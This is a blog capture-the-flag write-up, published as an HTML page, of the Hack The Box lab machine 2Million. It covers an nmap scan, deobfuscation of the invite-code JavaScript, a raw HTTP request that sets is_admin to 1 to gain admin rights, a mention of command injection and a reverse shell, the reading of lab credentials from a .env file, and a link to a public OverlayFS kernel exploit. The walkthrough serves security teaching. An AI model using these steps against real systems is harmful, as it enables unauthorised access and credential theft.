@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>CTF Report: 2Million - giuslock.github.io</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">giuslock.github.io</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">CTF Report: 2Million</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1739638746085"
+                  >2025-02-15 17:59</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1739638926471"
+                  >2025-02-15 18:02</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="ctf-report-2million">CTF Report: 2Million</h1>
+<p><img src="/_resources/0e0cdc5a31954e1f9684e83f8785e46f.png" /><br />
+<a title="https://app.hackthebox.com/machines/TwoMillion" href="https://app.hackthebox.com/machines/TwoMillion">https://app.hackthebox.com/machines/TwoMillion</a></p>
+<h2 id="initial-results-and-information">Initial Results and Information</h2>
+<p>We started by performing an Nmap scan on the target machine:</p>
+<div><pre class="hljs"><code>┌──(kali㉿kali)-[~]
+└─$ nmap -sC -sV -p- 10.10.11.221      
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-21 15:39 CEST
+Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.221
+Host is up (0.031s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx
+|_http-title: Did not follow redirect to http://2million.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 21.97 seconds
+We have two services running: SSH and a web server.</code></pre></div>
+<p>We have two services running: SSH and a web server.</p>
+<h2 id="enumeration-phase">Enumeration Phase</h2>
+<h3 id="web-server-homepage">Web Server Homepage</h3>
+<p><img src="/_resources/e69a8de843ea483381b69207ea40a0e6.png" /></p>
+<h3 id="directory-enumeration">Directory Enumeration</h3>
+<p><img src="/_resources/9720077350fd4964aba522d1bba48b30.png" /></p>
+<h3 id="login-page">Login Page</h3>
+<p><img src="/_resources/5e99bb976ff3475db6d7ff9848117903.png" /></p>
+<h3 id="invite-code-page">Invite Code Page</h3>
+<p><img src="/_resources/209d84e4da2d46dd99e102f96de47767.png" /></p>
+<h3 id="javascript-for-invite-code">JavaScript for Invite Code</h3>
+<p><img src="/_resources/980f84c29d5449b188f98886195625fc.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-built_in">eval</span>(
+  <span class="hljs-keyword">function</span> (<span class="hljs-params">p, a, c, k, e, d</span>) {
+    e = <span class="hljs-keyword">function</span> (<span class="hljs-params">c</span>) {
+      <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>)
+    };
+    <span class="hljs-keyword">if</span> (!<span class="hljs-string">''</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^/</span>, <span class="hljs-title class_">String</span>)) {
+      <span class="hljs-keyword">while</span> (c--) {
+        d[c.<span class="hljs-title function_">toString</span>(a)] = k[c] ||
+        c.<span class="hljs-title function_">toString</span>(a)
+      }
+      k = [
+        <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) {
+          <span class="hljs-keyword">return</span> d[e]
+        }
+      ];
+      e = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) {
+        <span class="hljs-keyword">return</span> <span class="hljs-string">'\\w+'</span>
+      };
+      c = <span class="hljs-number">1</span>
+    };
+    <span class="hljs-keyword">while</span> (c--) {
+      <span class="hljs-keyword">if</span> (k[c]) {
+        p = p.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">'\\b'</span> + <span class="hljs-title function_">e</span>(c) + <span class="hljs-string">'\\b'</span>, <span class="hljs-string">'g'</span>), k[c])
+      }
+    }
+    <span class="hljs-keyword">return</span> p
+  }(
+    <span class="hljs-string">'1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}'</span>,
+    <span class="hljs-number">24</span>,
+    <span class="hljs-number">24</span>,
+    <span class="hljs-string">'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">'|'</span>),
+    <span class="hljs-number">0</span>,
+    {
+    }
+  )
+)</code></pre></div>
+<h2 id="exploitation-phase">Exploitation Phase</h2>
+<p>The JavaScript was deobfuscated as follows:</p>
+<div><pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verifyInviteCode</span><span class="hljs-params">(code)</span></span>{
+    var formData = {<span class="hljs-string">"code"</span>: code};
+    $.ajax({
+        <span class="hljs-built_in">type</span>: <span class="hljs-string">"POST"</span>,
+        dataType: <span class="hljs-string">"json"</span>,
+        data: formData,
+        url: <span class="hljs-string">'/api/v1/invite/verify'</span>,
+        success: <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(response)</span></span>{
+            console.<span class="hljs-built_in">log</span>(response);
+        },
+        <span class="hljs-built_in">error</span>: <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(response)</span></span>{
+            console.<span class="hljs-built_in">log</span>(response);
+        }
+    });
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeInviteCode</span><span class="hljs-params">()</span></span>{
+    $.ajax({
+        <span class="hljs-built_in">type</span>: <span class="hljs-string">"POST"</span>,
+        dataType: <span class="hljs-string">"json"</span>,
+        url: <span class="hljs-string">'/api/v1/invite/generate'</span>,
+        success: <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(response)</span></span>{
+            console.<span class="hljs-built_in">log</span>(response);
+        },
+        <span class="hljs-built_in">error</span>: <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(response)</span></span>{
+            console.<span class="hljs-built_in">log</span>(response);
+        }
+    });
+}</code></pre></div>
+<h3 id="generating-the-invite-code">Generating the Invite Code</h3>
+<p>We performed a POST request to obtain the invite code:</p>
+<p><img src="/_resources/926f1d6e56ea4f6b82ec37096ba2d809.png" /></p>
+<p>Here it is in base64:<br />
+<code>NUxMWjktMVdGS0ktWDMyMjctSUxBTkQ=</code></p>
+<p>Using this code, we were able to register on the site:<br />
+<img src="/_resources/7713918da80a4ff0817d7dc61d4abe28.png" /></p>
+<h3 id="accessing-the-site">Accessing the Site</h3>
+<p>With the credentials:</p>
+<p>User: test<br />
+Email: test@test.it<br />
+Password: test</p>
+<p><img src="/_resources/6be4579d1434444db2fff07fb81b6026.png" /></p>
+<p>We successfully logged in:<br />
+<img src="/_resources/b8083f367b6c479d9be4dc57ccb9fd92.png" /></p>
+<h3 id="api-exploration">API Exploration</h3>
+<p>We found an API list within the web pages:<br />
+<img src="/_resources/d8919b9bd2254afd8da877075cd12349.png" /></p>
+<h3 id="modifying-admin-settings">Modifying Admin Settings</h3>
+<p>We attempted to modify the admin settings with the following payload:</p>
+<p><img src="/_resources/0b13d1ff786241e49df4b4f64e9608a2.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-keyword">PUT</span> <span class="hljs-string">/api/v1/admin/settings/update</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>2million.htb
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5
+<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=0at92ian3f6vu79iq3p3vjt6gc
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>55
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
+
+<span class="language-perl">{<span class="hljs-string">"email"</span>:<span class="hljs-string">"test@test.it"</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"test"</span>,<span class="hljs-string">"is_admin"</span>:<span class="hljs-number">1</span>}</span></code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK
+<span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>nginx
+<span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sun, 21 Jul 2024 14:55:58 GMT
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive
+<span class="hljs-attribute">Expires</span><span class="hljs-punctuation">: </span>Thu, 19 Nov 1981 08:52:00 GMT
+<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-store, no-cache, must-revalidate
+<span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>40
+
+<span class="language-json"><span class="hljs-punctuation">{</span><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span><span class="hljs-number">13</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"username"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"test"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"is_admin"</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">}</span></span></code></pre></div>
+<hr />
+<h3 id="confirmation-of-the-change">Confirmation of the change:</h3>
+<p><img src="/_resources/037c1dae5039405bbd8157f3476c3a22.png" /></p>
+<h3 id="verifying-admin-authentication">Verifying Admin Authentication</h3>
+<p>We performed a request to verify admin privileges:</p>
+<div><pre class="hljs"><code><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/v1/admin/auth</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>2million.htb
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5
+<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=0at92ian3f6vu79iq3p3vjt6gc
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0
+</code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK
+<span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>nginx
+<span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sun, 21 Jul 2024 14:58:00 GMT
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive
+<span class="hljs-attribute">Expires</span><span class="hljs-punctuation">: </span>Thu, 19 Nov 1981 08:52:00 GMT
+<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-store, no-cache, must-revalidate
+<span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>16
+
+<span class="language-json"><span class="hljs-punctuation">{</span><span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">}</span></span></code></pre></div>
+<p>Trying to open a vpn as an admin:<br />
+<img src="/_resources/820a42d9af444ef8a086d221a3b2fa65.png" /></p>
+<h3 id="command-injection-testing">Command Injection Testing</h3>
+<p>We identified a command injection vulnerability:<br />
+<img src="/_resources/e7bb422bb7f8489cba204b9cc8ffd78f.png" /></p>
+<p>We attempted to use a reverse shell:</p>
+<p><img src="/_resources/f2486c03e78d4da690be48324b644042.png" /></p>
+<h2 id="post-exploitation-phase">Post-Exploitation Phase</h2>
+<h3 id="enumeration-as-www-data">Enumeration as www-data</h3>
+<p>After gaining access, we started enumerating as www-data:</p>
+<div><pre class="hljs"><code>www-data@2million:~/html$ ls -la
+ls -la
+total 56
+drwxr-xr-x 10 root root 4096 Jul 21 15:30 .
+drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
+-rw-r--r--  1 root root   87 Jun  2  2023 .env
+-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
+-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
+drwxr-xr-x  5 root root 4096 Jul 21 15:30 VPN
+drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
+drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
+drwxr-xr-x  5 root root 4096 Jun  6  2023 css
+drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
+drwxr-xr-x  2 root root 4096 Jun  6  2023 images
+-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
+drwxr-xr-x  3 root root 4096 Jun  6  2023 js
+drwxr-xr-x  2 root root 4096 Jun  6  2023 views
+www-data@2million:~/html$ cat .env
+cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123</code></pre></div>
+<p>etc/passwd File:<br />
+<img src="/_resources/257fde15357d41feb633b73eca911fc9.png" /></p>
+<h3 id="logging-in-as-admin">Logging in as Admin</h3>
+<p>We tried logging in as the admin user:<br />
+<img src="/_resources/d77a46ad67544f5c8e7e6ee51cb0d1e6.png" /></p>
+<p>We obtained the following email:</p>
+<div><pre class="hljs"><code>admin@2million:/var/spool/mail$ cat admin                                                                           
+From: ch4p &lt;ch4p@2million.htb&gt;                                                                                      
+To: admin &lt;admin@2million.htb&gt;                                                                                      
+Cc: g0blin &lt;g0blin@2million.htb&gt;                                                                                    
+Subject: Urgent: Patch System OS                                                                                    
+Date: Tue, 1 June 2023 10:45:22 -0700                                                                               
+Message-ID: &lt;9876543210@2million.htb&gt;                                                                               
+X-Mailer: ThunderMail Pro 5.2                                                                                       
+                                                                                                                    
+Hey admin,                                                                                                          
+                                                                                                                    
+I<span class="hljs-string">'m know you'</span>re working as fast as you can to <span class="hljs-keyword">do</span> the DB migration. While we<span class="hljs-string">'re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can'</span>t get popped by that.
+
+HTB Godfather</code></pre></div>
+<p>Exploiting OverlayFS / FUSE<br />
+We searched for an exploit related to OverlayFS / FUSE and used the following exploit to escalate privileges:</p>
+<p><a title="https://github.com/xkaneiki/CVE-2023-0386" href="https://github.com/xkaneiki/CVE-2023-0386">https://github.com/xkaneiki/CVE-2023-0386</a></p>
+<p><img src="/_resources/d929cb8c9c794c65b29fe94f9627ed38.png" /></p>
+<p><img src="/_resources/96d841c7173f4dfc86d24849fad1a5b7.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
